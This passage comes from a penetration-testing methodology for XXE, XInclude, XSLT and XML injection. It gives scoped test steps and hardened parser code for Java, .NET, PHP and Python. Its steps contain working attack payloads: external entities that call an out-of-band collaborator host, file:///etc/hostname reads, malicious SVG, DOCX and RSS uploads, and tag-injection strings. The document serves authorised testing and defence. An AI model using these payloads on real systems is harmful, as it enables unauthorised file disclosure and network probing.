*Guler Tech methodology.* Implements the XXE external-entity check of WSTG-INJT-07, using an out-of-band interaction as the proof.

#### What it checks

Whether the parser resolves an **external general entity** by fetching a URL. A DNS lookup or HTTP request arriving at your collaborator proves resolution without reading anything from the target.

#### Prerequisites

An XML input that accepts a DOCTYPE (GT-WEB-XXE-4) or one you have not tested yet; agreement that OOB callbacks are allowed; a fresh collaborator subdomain for this request.

#### Steps

1. Declare an external entity pointing at your collaborator and reference it in a field:

```http
POST /api/orders/notes HTTP/1.1
Host: api.example.com
Authorization: Bearer <TOKEN_USER_A>
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE OrderNote [ <!ENTITY gtoob SYSTEM "http://gt-xxe-05.collab.example.org/x5"> ]>
<OrderNote><orderId>1001</orderId><note>&gtoob;</note></OrderNote>
```

2. Poll the collaborator for a short time (callbacks from queued workers can take minutes). Record source IP, time, protocol and, for HTTP, the `User-Agent` header (for example `Java/17.0.x`, `libxml2`, a .NET or PHP agent) because it identifies the parser.
3. If HTTP is blocked but DNS resolves, you will see only a DNS lookup; that still proves resolution.
4. If nothing arrives, also try an external DTD reference, which some parsers fetch even when they do not expand general entities:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE OrderNote SYSTEM "http://gt-xxe-05b.collab.example.org/x5b.dtd">
<OrderNote><orderId>1001</orderId><note>GT-A-canary-05</note></OrderNote>
```

```bash
curl -s -i -X POST 'https://api.example.com/api/orders/notes' \
  -H 'Authorization: Bearer <TOKEN_USER_A>' -H 'Content-Type: application/xml' \
  --data-binary @gt-xxe-05.xml
```

#### Observation

Collaborator log (illustrative):

```text
DNS  query  gt-xxe-05.collab.example.org   from 203.0.113.40   12:04:11 UTC
HTTP GET    /x5                             from 203.0.113.40   12:04:11 UTC
     User-Agent: Java/17.0.12
```

Safe: no interaction, and the response shows a DTD rejection or an unchanged document.

#### Evaluation

- **Fail:** any interaction that matches this payload's unique subdomain. The parser resolves external entities or external DTDs for untrusted input (CWE-611; ASVS `v5.0.0-1.5.1` L1). Without file read this is the "OOB-only XXE" anchor in [Rating findings](#rating-findings): Medium by default, rising when the source IP shows the request came from an internal worker with network reach.
- **Pass:** no interaction for either payload, combined with a rejection or an ignored DTD.
- A missing callback is **not** proof of safety: egress filtering can block it. Combine with GT-WEB-XXE-4 and, where available, GT-WEB-XXE-12.

#### False positives

- **Your own tools:** link previews in chat tools, email scanners or the browser fetching the URL because you pasted it somewhere. Use a fresh subdomain that only ever appeared in this request.
- **Security products:** some WAFs and sandboxes fetch URLs found in request bodies. Check the source IP against the client's ranges; a fetch from a vendor's network, with no fetch from the application's egress IP, is not XXE.
- **Delayed pipelines:** a callback an hour later can come from a nightly import job reading what you stored; that is still a finding, but for the job, not the endpoint.

#### Automation

Burp Scanner uses Collaborator for exactly this check. Keep it targeted: one payload per mapped XML input. XXEinjector automates exploitation and exfiltration and is not needed (or appropriate) for detection on client systems.

### GT-WEB-XXE-6: Blind detection with parameter entities

*Guler Tech methodology.* Implements the blind XXE (out-of-band detection via parameter entities) section of WSTG-INJT-07.

#### What it checks

Whether the parser resolves **external parameter entities**. Some configurations block general entities in the document body but still process parameter entities inside the DTD, and some filters only look for `&name;` references.

#### Prerequisites

As GT-WEB-XXE-5, with a new collaborator subdomain.

#### Steps

1. Send a DTD whose only action is to reference an external parameter entity:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE OrderNote [ <!ENTITY % gtpe SYSTEM "http://gt-xxe-06.collab.example.org/x6"> %gtpe; ]>
<OrderNote><orderId>1001</orderId><note>GT-A-canary-06</note></OrderNote>
```

2. Watch the collaborator as in GT-WEB-XXE-5.
3. Stop there. Serving a DTD from your collaborator that reads a file and sends it back (the "malicious external DTD" technique) is exfiltration and is out of scope without explicit written approval; if the client wants that step demonstrated, agree it and limit it to the agreed harmless file.

#### Observation

A DNS or HTTP hit for `gt-xxe-06` (illustrative, as in GT-WEB-XXE-5). Requests for a path such as `/x6` with no follow-up are expected because your collaborator returns nothing useful.

#### Evaluation

- **Fail:** interaction received. External parameter entities are resolved, which is the building block of blind file exfiltration. Rate as OOB-only XXE (Medium) unless other evidence shows file-read reach.
- **Pass:** no interaction and a DTD rejection or ignored DTD.

#### False positives

As GT-WEB-XXE-5. Also check that the interaction is not from GT-WEB-XXE-5's subdomain arriving late.

#### Automation

Burp Scanner covers parameter-entity OOB checks. In code, the fix and its test are the same as for GT-WEB-XXE-5: reject DOCTYPE, or turn off `external-parameter-entities` explicitly when DTDs must stay.

### GT-WEB-XXE-7: Agreed-file read and error-based disclosure

*Guler Tech methodology.* Implements the local file disclosure part of WSTG-INJT-07, limited to one agreed harmless file.

#### What it checks

Whether a resolved external entity's content comes back to you, in a field or in an error message. This is what moves an XXE from "resolves entities" to "reads local files", and it is the most common reason an XXE is rated High.

#### Prerequisites

GT-WEB-XXE-5 or -6 showed resolution, or GT-WEB-XXE-4 showed entity expansion in a reflected field; written agreement on the proof file (`/etc/hostname` or the client's canary file); the stop rules from [Before you start](#before-you-start) fresh in mind.

#### Steps

1. Reference the agreed file in a field that is reflected:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE OrderNote [ <!ENTITY gtfile SYSTEM "file:///etc/hostname"> ]>
<OrderNote><orderId>1001</orderId><note>&gtfile;</note></OrderNote>
```

2. If no field is reflected, look at errors: put the entity into a field with a strict type (a number, a date, an enumeration). Some applications quote the offending value in the error, as in the Twitter case in [Real-world cases](#real-world-cases), where a numeric field's conversion error echoed the entity's content.
3. Send it **once**. Record the response, redact anything beyond the hostname or canary string, and stop.
4. Do not change the path to anything else. If the agreed file does not exist on the target, ask the client for another one rather than guessing.

#### Observation

Vulnerable (illustrative):

```http
HTTP/1.1 200 OK
Content-Type: application/json

{"orderId":1001,"note":"app-worker-03\n"}
```

or, error-based:

```http
HTTP/1.1 400 Bad Request
Content-Type: application/xml

<error code="1010" message="Cannot convert [app-worker-03] to an integer for [orderId]"/>
```

Safe: DTD rejected, entity left unexpanded, or an empty value with no error.

#### Evaluation

- **Fail:** the agreed file's content appears in any response. The application discloses local files to whoever can reach this input (CWE-611). Rate per [Rating findings](#rating-findings): typically High; rated on who can reach it (unauthenticated or any registered user) and on what the process could read.
- **Error-based variants** that need an external DTD to build a file path inside an error message (WSTG's "error-based exfiltration") are **described, not run**: they require serving a file-reading DTD, which is exfiltration. If the client wants that demonstrated, agree it in writing and limit it to the agreed file. The local-DTD repurposing technique (reusing a DTD that exists on the server) is likewise prose-only unless explicitly approved.
- **Pass:** no content returned and GT-WEB-XXE-5/-6 negative.

#### False positives

The hostname appears because the application prints it elsewhere (a footer, a header such as `X-Served-By`); compare with a baseline response. A canary file the client placed on a different host from the one that parses XML gives a false negative, not a false positive: confirm which host handles the request.

#### Automation

Do not automate file reads against client systems. In the client's tests, the GT-WEB-XXE-4 rejection test already covers this path; add a second test with a `SYSTEM` entity pointing at a file in the test fixtures and assert that its content never appears.

### GT-WEB-XXE-8: XInclude when you control only a fragment

*Guler Tech methodology.* Implements the XInclude section of WSTG-INJT-07.

#### What it checks

Whether a value you send is embedded unescaped into a server-built XML document **and** that document is processed with XInclude enabled, which allows file or URL inclusion without any DOCTYPE.

#### Prerequisites

A parameter that GT-WEB-XXE-3 showed is embedded in XML without encoding (an XML error for `<` or `&`, or parsed markup), typically a form or query value forwarded to a back-end XML service.

#### Steps

1. First check with an include that points at your collaborator, URL-encoded as needed for the parameter's location:

```http
POST /api/stock/check HTTP/1.1
Host: app.example.com
Cookie: session=<SESSION_USER_A>
Content-Type: application/x-www-form-urlencoded

productId=<gt xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="http://gt-xxe-08.collab.example.org/x8"/></gt>&storeId=1
```

2. If the collaborator sees a request, or the response shows XInclude-related errors (for example "could not load" or `xi:include` messages), you may repeat once with the agreed file only: `href="file:///etc/hostname"` with `parse="text"`.
3. Stop after the single agreed-file proof.

#### Observation

Vulnerable (illustrative): an HTTP hit on `gt-xxe-08`, or the response shows `Invalid product ID: app-worker-03`.

Safe: the literal string comes back encoded, the include element is ignored, or the service rejects the value as not a number.

#### Evaluation

- **Fail:** collaborator interaction or agreed-file content. Two defects are present: unencoded input in a server-built document (CWE-91) and XInclude processing on untrusted content (CWE-611 family; ASVS `v5.0.0-1.5.1`). Rate like GT-WEB-XXE-5 (OOB only) or GT-WEB-XXE-7 (file read).
- **Partial:** markup is interpreted but XInclude does nothing. Report the structural injection (GT-WEB-XXE-10) on its own merits.
- **Pass:** value encoded or strictly validated.

#### False positives

Your request body reaching a WAF that resolves nothing but logs a parsing failure. A collaborator hit caused by a link-preview or logging pipeline that fetched URLs it found in logs (use the source IP and timing to tell them apart).

#### Automation

Burp Scanner includes XInclude checks for parameters. In code, assert that XInclude is off on every parser factory (Java `isXIncludeAware()` false; lxml never calls `xinclude()` on untrusted trees) and that the server-built document is produced with a DOM or streaming writer, not string concatenation.

### GT-WEB-XXE-9: XML inside uploads and imports

*Guler Tech methodology.* Implements the "XXE via file upload" and "other XML-based formats" sections of WSTG-INJT-07, together with WSTG-BUSL-08 (unexpected file types) and WSTG-BUSL-09 (malicious files).

#### What it checks

Whether files and fetched documents that are XML, or contain XML parts, are parsed with external entity resolution: SVG images, DOCX/XLSX/PPTX and ODF documents, XLIFF, GPX/KML, XMP metadata, RSS/Atom feeds and sitemaps.

#### Prerequisites

Upload and import features from GT-WEB-XXE-1; your own test account and upload area; for feeds and "import from URL", a web server you control on the internet (or your collaborator's HTTP service) that can serve a test document; fresh collaborator subdomains for each file.

#### Steps

1. **SVG.** Upload a small, valid SVG whose DTD references your collaborator. Use the OOB form first:

```xml
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg [ <!ENTITY gtsvg SYSTEM "http://gt-xxe-09a.collab.example.org/svg"> ]>
<svg xmlns="http://www.w3.org/2000/svg" width="200" height="40"><text x="5" y="25">&gtsvg;</text></svg>
```

Upload it as `.svg` with `image/svg+xml`, then, if the form only allows raster images, once more with a `.png` name to see whether the library sniffs the content. Open the generated thumbnail or preview: some pipelines render the entity text into the image.

2. **Office documents.** Take a valid DOCX or XLSX you created, unzip it, add a DOCTYPE with a collaborator entity to **one** part, and zip it back without changing anything else:

```bash
mkdir gt-docx && cd gt-docx && unzip -q ../gt-sample.docx
# Edit word/document.xml: after the XML declaration add
#   <!DOCTYPE w:document [ <!ENTITY gtdoc SYSTEM "http://gt-xxe-09b.collab.example.org/docx"> ]>
# and put &gtdoc; inside one <w:t> element.
zip -q -r -X ../gt-xxe-09b.docx '[Content_Types].xml' _rels docProps word
```

Repeat with a separate subdomain per part you try (`[Content_Types].xml`, `word/document.xml`, `xl/sharedStrings.xml`, `xl/workbook.xml`), because different libraries read different parts first. `oxml_xxe` can build such files, but hand-editing one part keeps you in control of what the file contains.

3. **Feeds, sitemaps and URL imports.** Host a minimal feed or sitemap on your server whose DOCTYPE references your collaborator, and point the feature at it:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE rss [ <!ENTITY gtrss SYSTEM "http://gt-xxe-09c.collab.example.org/rss"> ]>
<rss version="2.0"><channel><title>&gtrss;</title><link>https://example.org/</link><description>GT test</description></channel></rss>
```

4. **Other formats** (XLIFF, GPX, KML, XMP in JPEG/PDF, plugin descriptors): the same pattern, one collaborator entity, one file at a time.
5. If, and only if, an OOB interaction arrives and the client agreed, repeat the **one** format that triggered it with the agreed file to show reflection (for example in the thumbnail text, an extracted title or an import summary).
6. Delete your uploads afterwards or list them for the client.

#### Observation

Vulnerable (illustrative): a hit on `gt-xxe-09b` from `198.51.100.23` with `User-Agent: Java/11.0.x` thirty seconds after upload, from the document-preview worker; or an import summary that reads `Imported feed: app-worker-03`.

Safe: no interactions; the preview shows the entity reference literally or nothing; the upload is rejected as an unsupported type.

#### Evaluation

- **Fail:** any interaction or agreed-file reflection tied to a specific file. Rate on reach (OOB only versus file read), on who can upload (anonymous, any user, admin only) and on whether the worker runs on a separate host with network reach (Scope Changed only when that host belongs to other systems, see [Rating findings](#rating-findings)).
- An SVG that is accepted and later served to browsers from the application's origin is also a **stored XSS** candidate (scripts and event handlers in SVG), covered by ASVS `v5.0.0-1.3.4` (L2) and the Client-Side subcategory (not yet published). Report it separately; do not chain it here.
- **Pass:** no resolution in any format, and uploads validated against the expected type (ASVS `v5.0.0-5.2.2`).

#### False positives

Antivirus or content-scanning services fetching URLs found inside uploaded documents (check source IP and `User-Agent`). Office features on *your* machine fetching the entity when you open the edited file locally: do not open the test files in a desktop office suite. A feed reader that fetches your feed URL is expected; only the fetch of the **collaborator entity URL** matters.

#### Automation

Keep a small set of test fixtures (SVG, DOCX, XLSX, RSS) with collaborator placeholders in your engagement kit. For the client's CI, add one fixture per accepted format to the upload pipeline's tests, with the entity pointing at a local test HTTP server, and assert that the server receives nothing.

### GT-WEB-XXE-10: XML injection into server-built documents

*Guler Tech methodology.* Implements the tag injection section of WSTG-INJT-07.

#### What it checks

Whether input concatenated into XML that the application builds (for a SOAP partner, a payment or ERP connector, an export, a configuration file) can change that document's structure: add elements, override attributes, or comment out server-generated parts.

#### Prerequisites

A parameter that GT-WEB-XXE-3 showed ends up unencoded in XML; an understanding of the document structure (from a WSDL, an export you can download, error messages, or documentation); **own test objects only**; agreement on which business operations you may exercise (for example an order in a test store that the client cancels).

#### Steps

1. Infer the structure. Suppose an export of your order shows that the application builds:

```xml
<order><item><sku>GT-SKU-1</sku><qty>1</qty><price>42.00</price></item><note>USER_INPUT</note></order>
```

2. First prove structure change with a harmless, observable element. Put a well-formed extra element in the note and check whether it appears as a separate element in the export or the partner's response:

```text
GT-note</note><gtmarker>GT-structure-10</gtmarker><note>GT-note-2
```

3. If the marker appears as an element (not as text), stop at that proof for business-critical fields. Describe in the report what an attacker could add (for example a second `<price>` or `<userid>` element, or a `role` attribute) instead of sending a modified price or identity to a real partner system.
4. Where the client provides a test partner endpoint or sandbox and explicitly agrees, a single injection of a duplicated **non-financial** element on your own test order shows which occurrence the receiver uses.
5. For attributes, test with a quote and a harmless attribute name:

```text
GT-name" gtattr="GT-attr-10
```

6. For SOAP services you call directly, the same applies inside the body: a value that closes its element and adds a sibling element, observed in the response or a SOAP fault.

#### Observation

Vulnerable (illustrative): the downloaded export contains

```xml
<note>GT-note</note><gtmarker>GT-structure-10</gtmarker><note>GT-note-2</note>
```

Safe: the export contains `<note>GT-note&lt;/note&gt;&lt;gtmarker&gt;…</note>`, or the input is rejected.

#### Evaluation

- **Fail:** your marker becomes a real element or attribute. The application does not encode input for XML context (CWE-91; ASVS `v5.0.0-1.2.1` L1). Rate on what the receiving system does with the document: Medium as a default when you prove structure change; High when the injectable document carries prices, identities, roles or payment instructions that the receiver trusts.
- **Pass:** values are encoded (or built with a DOM/streaming API) and appear only as text.

#### False positives

The export is rendered by your browser and the "element" exists only in the HTML view: download the raw file. A field that legitimately accepts XML fragments by design (an XML editor feature) is not injection, but then check it with GT-WEB-XXE-4 to -8 as parser input.

#### Automation

Burp Scanner flags some XML injection. In CI, a unit test that feeds `</note><x/>` through the document builder and asserts that the output parses to exactly one `note` element with that literal text.

### GT-WEB-XXE-11: XSLT processing and user-controlled stylesheets

*Guler Tech methodology.* Implements WSTG-INJT-07 for XSLT-based processing and checks ASVS `v5.0.0-1.3.5`.

#### What it checks

Whether users can supply or influence an XSLT stylesheet that the server runs, and what the processor allows. A user-controlled stylesheet is code execution by design if extension functions are enabled, and file or URL access if `document()` and includes are allowed.

#### Prerequisites

A feature from GT-WEB-XXE-1 that accepts a template, stylesheet or "layout" (upload, editor, or a parameter that names a stylesheet); your own test account.

#### Steps

1. Upload or save a stylesheet that only prints processor properties:

```xml
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">GT-xslt-11 vendor=<xsl:value-of select="system-property('xsl:vendor')"/> version=<xsl:value-of select="system-property('xsl:version')"/></xsl:template>
</xsl:stylesheet>
```

2. Run the feature (render the report, preview the invoice). The vendor string (for example "Apache Software Foundation", "Saxonica", "libxslt", "Microsoft") tells you which processor you are dealing with and that your stylesheet runs.
3. Check external access with your collaborator, not with local files:

```xml
<xsl:value-of select="document('http://gt-xxe-11.collab.example.org/x11')"/>
```

4. Do **not** test extension functions by calling host-language methods. Instead, record the processor and version, and ask the client (or check the code) whether extension functions or scripts are enabled (`XsltSettings.EnableScript`, `XSLTProcessor::registerPHPFunctions()`, Xalan/Saxon extension configuration, `jdk.xml.enableExtensionFunctions`).
5. If the stylesheet is selected by a parameter (`?template=invoice.xsl`), check whether a URL or path to your collaborator is fetched; do not traverse to local files.

#### Observation

Vulnerable (illustrative): the rendered report shows `GT-xslt-11 vendor=Apache Software Foundation (Xalan XSLTC) version=1.0`, and the collaborator receives a request for `/x11`.

Safe: arbitrary stylesheets are rejected (only a fixed set of templates or a restricted template language is available), or `document()` calls fail with an access error.

#### Evaluation

- **Fail (High or Critical):** users can run their own stylesheets. Rate Critical when extension functions or scripts are enabled (code execution by design, confirmed from configuration rather than by exploitation), High when `document()` or includes reach your collaborator or files.
- **Fail (Medium):** users run stylesheets in a processor with external access and extensions disabled and verified; the residual risk is resource abuse and information disclosure.
- **Pass:** no user-controlled stylesheet, or a sandboxed processor with external access and extensions off.

#### False positives

A template feature that only lets users fill placeholders in a fixed stylesheet is not XSLT injection. Client-side XSLT in the browser (`XSLTProcessor` in JavaScript) runs on the user's machine.

#### Automation

CodeQL has a Java query for XSLT transformation with a user-controlled stylesheet (`java/xslt-injection`). In code review, search for `newTransformer(`, `XslCompiledTransform`, `XSLTProcessor` and `lxml.etree.XSLT` with any input that is not a constant resource.

### GT-WEB-XXE-12: Parser configuration review and expansion limits

*Guler Tech methodology.* Implements the white-box testing section of WSTG-INJT-07 and replaces entity-expansion (DoS) testing on shared systems.

#### What it checks

The actual configuration of every XML parser, transformer and schema validator the application uses, including third-party libraries, against the hardening in [Secure implementation](#secure-implementation). This is how you assess entity-expansion limits and paths you cannot reach as a black-box tester.

#### Prerequisites

Source access or a code walkthrough with a developer; the dependency manifest (`pom.xml`, `build.gradle`, `*.csproj`, `composer.lock`, `requirements.txt`/`poetry.lock`, `package-lock.json`); deployment details (JDK version, .NET target framework and `Web.config`, PHP and libxml2 versions, Python and Expat versions).

#### Steps

1. Search for parser creation and flags:

```bash
# Java
grep -rnE 'DocumentBuilderFactory|SAXParserFactory|XMLInputFactory|TransformerFactory|SchemaFactory|SAXReader|SAXBuilder|XMLDecoder|setXIncludeAware|disallow-doctype-decl|SUPPORT_DTD' src/
# .NET
grep -rnE 'XmlDocument|XmlTextReader|XmlReaderSettings|DtdProcessing|XmlResolver|XmlUrlResolver|XslCompiledTransform|EnableScript' --include='*.cs' --include='*.config' .
# PHP
grep -rnE 'LIBXML_(NOENT|DTDLOAD|DTDVALID|XINCLUDE|PARSEHUGE)|simplexml_load|DOMDocument|XMLReader|libxml_set_external_entity_loader|XSLTProcessor' --include='*.php' .
# Python
grep -rnE 'resolve_entities|no_network|load_dtd|huge_tree|xinclude\(|feature_external_(ges|pes)|defusedxml|xml\.etree|minidom|pulldom|xml\.sax' --include='*.py' .
# Node.js
grep -rnE 'libxmljs|noent|replaceEntities|nonet|xml2js|fast-xml-parser|xmldom|xpath' --include='*.js' --include='*.ts' . | grep -v node_modules
```

2. For each hit, record: input source (trusted or not), parser, the security settings applied, and whether a failure to set a feature is caught and ignored (a `try { setFeature(...) } catch (...) {}` that continues parsing is a finding).
3. Check versions against the defaults table: libxml2 ≥ 2.9, lxml ≥ 5.0 (and the later `iterparse` and parameter-entity fixes), .NET Framework ≥ 4.5.2 **and** `<httpRuntime targetFramework="4.5.2">` or later in `Web.config`, Expat ≥ 2.7.2 for Python's expansion protections, a supported JDK.
4. Check **expansion and size limits**: no `huge_tree=True`, `LIBXML_PARSEHUGE` or `XML_PARSE_HUGE` on untrusted input; Java secure processing on (it sets entity-expansion limits) and no raised `jdk.xml.entityExpansionLimit` or `jdk.xml.totalEntitySizeLimit`; .NET `MaxCharactersFromEntities` not set to unlimited where DTDs are parsed; request and upload size limits, and uncompressed-size limits for DOCX/XLSX (ASVS `v5.0.0-5.2.3`).
5. Check third-party libraries that parse XML internally (document converters, SAML libraries, SOAP stacks, sitemap/feed parsers) against their advisories.

#### Observation

A table like this (illustrative):

| Location | Parser | Untrusted input? | Settings | Verdict |
|---|---|---|---|---|
| `OrderXmlController` | `DocumentBuilderFactory.newInstance()` | yes | none | XXE (confirmed by GT-WEB-XXE-5) |
| `FeedImporter.py` | `lxml.etree.XMLParser(resolve_entities=True)` | yes | `no_network` default | XXE (file and network via other schemes) |
| `MediaService.php` | `simplexml_load_string($x, …, LIBXML_NOENT)` | yes (uploads) | none | XXE (CWE-611) |
| `ReportService.cs` | `XmlReader` | yes | defaults, `net48` | safe |
| `ExportBuilder.java` | string concatenation | yes | none | XML injection (CWE-91) |

#### Evaluation

- **Fail:** any parser on untrusted input without DTD rejection or external-entity/XInclude restrictions (CWE-611; CWE-827 when the problem is specifically that the document controls which DTD is loaded); missing or raised expansion limits (CWE-776); string-built XML (CWE-91). Rate configuration-only findings on the evidence: a confirmed reachable path is rated like the black-box result; an unreachable-looking path is Low to Medium with a clear statement that reachability was not shown.
- **Pass:** a single hardened factory used everywhere, versions current, limits at defaults or stricter.

#### False positives

Parsers that only read files shipped with the application (bundled configuration, signed resources). Test code. A `setFeature` call inside a `try` that is re-thrown as a fatal error (that is correct behaviour).

#### Automation

Semgrep and CodeQL rules in [Static analysis](#static-analysis); dependency scanning for parser and document-library advisories (ASVS `v5.0.0-15.2.1`).

## Secure implementation

### Design rules

- **Prefer JSON** (or another format without entities) for new interfaces. If an endpoint does not need XML, make it refuse XML: restrict accepted media types per route and remove XML message converters you do not use.
- **Reject DOCTYPE** wherever XML is needed but DTDs are not, which is almost always. Rejection fails loudly and covers external entities, parameter entities, external DTDs and entity expansion in one switch. Where DTDs are genuinely needed, turn off external general entities, external parameter entities and external DTD loading separately, keep expansion limits, and resolve any required DTDs from a local catalogue only.
- **Keep XInclude off** and give **XSLT processors and schema validators their own restrictions**; they load resources independently of the input parser.
- **One hardened factory per language**, used everywhere, including in upload workers, document converters and SOAP clients. Fail closed: if a security feature cannot be set, stop rather than parse with partial hardening (the XXE Prevention Cheat Sheet makes the same point).
- **Never pass user-supplied URLs or file names to a parser.** Fetch the content yourself with your SSRF controls, then parse the bytes.
- **Build XML with an API**, not string concatenation, so values are always encoded for their position (ASVS `v5.0.0-1.2.1`).
- **Least privilege for parsers:** run document processing in a sandbox or container with no access to secrets and no outbound network beyond what it needs. This turns a future parser bug into a much smaller finding.
- **Keep parser libraries current** (libxml2, lxml, Expat, document libraries) and track their advisories (ASVS `v5.0.0-15.2.1`).

### Java and Spring

Java is the platform where an unhardened parser is the default, so centralise configuration. The settings below follow the OWASP XXE Prevention Cheat Sheet and the JAXP Security Guide; `newDefaultInstance()` (Java 9+) selects the JDK's built-in implementation, so a different provider on the classpath does not silently change the behaviour.

```java
import javax.xml.XMLConstants;
import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;
import javax.xml.parsers.ParserConfigurationException;
import javax.xml.parsers.SAXParserFactory;
import javax.xml.stream.XMLInputFactory;
import javax.xml.stream.XMLStreamException;
import javax.xml.transform.TransformerConfigurationException;
import javax.xml.transform.TransformerFactory;

public final class SafeXml {
    private SafeXml() {}

    public static DocumentBuilder documentBuilder() throws ParserConfigurationException {
        DocumentBuilderFactory dbf = DocumentBuilderFactory.newDefaultInstance();
        dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true); // throws if unsupported
        dbf.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);
        dbf.setXIncludeAware(false);
        dbf.setNamespaceAware(true);
        return dbf.newDocumentBuilder();
    }

    public static SAXParserFactory saxParserFactory() throws Exception {
        SAXParserFactory spf = SAXParserFactory.newDefaultInstance();
        spf.setNamespaceAware(true);
        spf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
        spf.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);
        spf.setXIncludeAware(false);
        return spf;
    }

    public static XMLInputFactory staxFactory() {
        XMLInputFactory xif = XMLInputFactory.newDefaultFactory();
        xif.setProperty(XMLInputFactory.SUPPORT_DTD, false);
        xif.setProperty(XMLInputFactory.IS_SUPPORTING_EXTERNAL_ENTITIES, false);
        xif.setXMLResolver((publicId, systemId, baseUri, namespace) -> {
            throw new XMLStreamException("External references are not allowed");
        });
        return xif;
    }

    public static TransformerFactory transformerFactory() throws TransformerConfigurationException {
        TransformerFactory tf = TransformerFactory.newDefaultInstance();
        tf.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);
        tf.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, "");
        tf.setAttribute(XMLConstants.ACCESS_EXTERNAL_STYLESHEET, "");
        return tf;
    }
}
```

Notes that cause real bugs:

- Do not wrap `setFeature` in a `try/catch` that logs and continues. If the provider does not support the feature, parsing must not go ahead.
- `setExpandEntityReferences(false)` changes how entity references appear in the DOM; it does **not** block external resources.
- `SAXParser.parse(source, handler)` replaces any `EntityResolver` you set on the reader with the handler; call `reader.parse(...)` directly if you rely on a resolver.
- dom4j `SAXReader`, JDOM `SAXBuilder` and Commons Digester must be handed a hardened `XMLReader`; they otherwise build their own.
- For JAXB, unmarshal from the hardened `XMLStreamReader` rather than raw input, so the provider does not choose the parser.
- `java.beans.XMLDecoder` must never see untrusted input; it is a deserialisation sink, not just a parser (Server-Side Request & Files subcategory, not yet published).
- Recent JDKs document a JVM-wide switch, `jdk.xml.dtd.support=deny`, settable as a system property or in a JAXP configuration file, and ship a stricter `jaxp-strict.properties.template` under `$JAVA_HOME/conf`. They are useful as defence in depth and for finding code that relies on DTDs, but do not replace per-factory settings in libraries that set their own.

**Spring.** Restrict media types on endpoints that only need JSON, so a stray XML converter is never reached:

```java
@PostMapping(path = "/api/orders/notes", consumes = MediaType.APPLICATION_JSON_VALUE)
public ResponseEntity<Void> addNote(@RequestBody @Valid OrderNote note) {
    orderService.addNote(note);
    return ResponseEntity.noContent().build();
}
```

If XML is not part of the API, do not ship `jackson-dataformat-xml`. If it is, Jackson's `XmlFactory` disables DTD support and external entities on the StAX factory it creates itself; if you pass your own `XMLInputFactory`, build it with `SafeXml.staxFactory()`. Spring OXM's `Jaxb2Marshaller` defaults to `supportDtd=false` and `processExternalEntities=false`; leave them that way. For Spring Web Services and other SOAP stacks, check which parser the message factory uses and whether WS-Security processing parses the envelope again.

### .NET

On .NET Framework 4.5.2 and later, and on modern .NET, the defaults are safe. Bugs come from re-enabling DTDs with a resolver, from old target frameworks, and from ASP.NET applications missing the runtime target in `Web.config`.

```csharp
var settings = new XmlReaderSettings
{
    DtdProcessing = DtdProcessing.Prohibit,   // throw on DOCTYPE
    XmlResolver = null,                       // no external resolution
    MaxCharactersFromEntities = 1024,         // belt and braces if DTDs are ever enabled
    MaxCharactersInDocument = 10_000_000
};
using var reader = XmlReader.Create(requestStream, settings);
var doc = new XmlDocument { XmlResolver = null };
doc.Load(reader);
```

```xml
<!-- Web.config for ASP.NET on .NET Framework: the effective version is the lower of the build target and this value -->
<system.web>
  <httpRuntime targetFramework="4.8" />
</system.web>
```

Avoid `new XmlUrlResolver()` on untrusted input, and do not enable `XsltSettings.EnableScript` or `EnableDocumentFunction` for stylesheets you did not write.

### PHP and Laravel

PHP 8 requires libxml2 ≥ 2.9.0, so `DOMDocument`, `SimpleXML` and `XMLReader` do not load external entities by default; `libxml_disable_entity_loader()` is deprecated because of that. The dangerous part is flags:

- `LIBXML_NOENT` **enables** entity substitution. Its name reads like "no entities", which is how the WordPress media library bug in [Real-world cases](#real-world-cases) happened on PHP 8.
- `LIBXML_DTDLOAD` loads external DTDs; `LIBXML_DTDVALID` validates against them; `LIBXML_XINCLUDE` performs XInclude in `XMLReader`.
- `LIBXML_NO_XXE` (PHP 8.4 with libxml2 ≥ 2.13) blocks external entities even where substitution is needed.

```php
<?php
// Install once per request before parsing untrusted XML: every external load returns nothing.
libxml_set_external_entity_loader(static fn (...$args) => null);

$dom = new DOMDocument();
$ok = $dom->loadXML($xml, LIBXML_NONET);          // no LIBXML_NOENT, no LIBXML_DTDLOAD
if (!$ok || $dom->doctype !== null) {
    throw new InvalidArgumentException('DOCTYPE not allowed');
}
```

Pass a callback that returns `null`; passing `null` itself to `libxml_set_external_entity_loader()` does not block loading (the cheat sheet calls this out). Laravel has no built-in XML request parsing, so XML usually arrives through a controller calling `simplexml_load_string()` or a package (SOAP clients, spreadsheet importers, SAML libraries); apply the same rules there and check each package's parser flags. For XSLT, never call `XSLTProcessor::registerPHPFunctions()` on stylesheets users can influence. On PHP 7.x and older libxml2, `libxml_disable_entity_loader(true)` is still required.

### Python and Django

Use **defusedxml** for untrusted input instead of calling the standard library directly. It rejects entity declarations and external references by default and can reject any DTD:

```python
from defusedxml.ElementTree import fromstring
from defusedxml import DefusedXmlException

def parse_order(xml_bytes: bytes):
    try:
        root = fromstring(xml_bytes, forbid_dtd=True)   # forbid_entities and forbid_external default to True
    except DefusedXmlException as exc:
        raise ValueError("XML with DTD or entities is not accepted") from exc
    return root
```

With **lxml**, set the options explicitly so the code does not depend on the installed version's defaults (lxml before 5.0 resolved entities by default, and later fixes changed `iterparse()` and parameter-entity handling):

```python
from lxml import etree

SAFE_PARSER = etree.XMLParser(
    resolve_entities=False, no_network=True, load_dtd=False,
    dtd_validation=False, huge_tree=False,
)
root = etree.fromstring(xml_bytes, parser=SAFE_PARSER)
# Never call root.getroottree().xinclude() on untrusted documents.
```

